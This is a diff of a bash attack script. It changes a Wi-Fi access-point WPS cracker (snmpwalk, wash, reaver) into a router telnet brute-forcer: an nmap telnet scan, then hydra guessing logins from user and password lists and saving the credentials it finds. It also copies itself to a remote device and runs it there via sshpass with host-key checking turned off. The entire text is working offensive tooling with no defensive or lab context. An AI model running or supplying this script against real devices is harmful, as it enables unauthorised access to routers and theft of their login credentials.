@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# ap_scan.sh
+# router_telnet_bruteforce.sh
 # Adapted with remote-vs-local execution: remote scan vs on-device via SSH
-# Usage: ./ ap_scan.sh
+# Usage: ./ router_telnet_bruteforce.sh
 # Requires appropriate tools depending on mode
 
 function detect_os() {
@@ -27,11 +27,9 @@ function ensure_tool() {
 }
 
 function remote_scan() {
-  read -rp "AP IP: " TARGET
-snmpwalk -v2c -c public "$TARGET" system
-wash -i wlan0 -o ap_wps.txt
-BSSID=$(awk 'NR==2{print $1}' ap_wps.txt)
-reaver -i wlan0 -b "$BSSID" -vv
+  read -rp "Router IP: " TARGET
+nmap -p23 --script telnet-encryption -oN telnet_enum_${TARGET}.txt "$TARGET"
+hydra -t 8 -L users.txt -P passwords.txt telnet://"$TARGET" -o telnet_creds.txt
 
 }
 
@@ -40,8 +38,8 @@ function remote_ssh_execute() {
   local user="$SSH_USER"
   local pass="$SSH_PASS"
   echo "[*] Copying script and executing on-device via SSH"
-  scp "$0" "$user@$host:/tmp/ap_scan.sh"
-  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/ap_scan.sh on-device"
+  scp "$0" "$user@$host:/tmp/router_telnet_bruteforce.sh"
+  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/router_telnet_bruteforce.sh on-device"
 }
 
 # Main
@@ -61,9 +59,7 @@ if [[ "$MODE" == "2" ]]; then
 else
   # perform remote scan
   ensure_tool nmap
-ensure_tool snmpwalk
-ensure_tool wash
-ensure_tool reaver
+ensure_tool hydra
   remote_scan
   exit 0
 fi
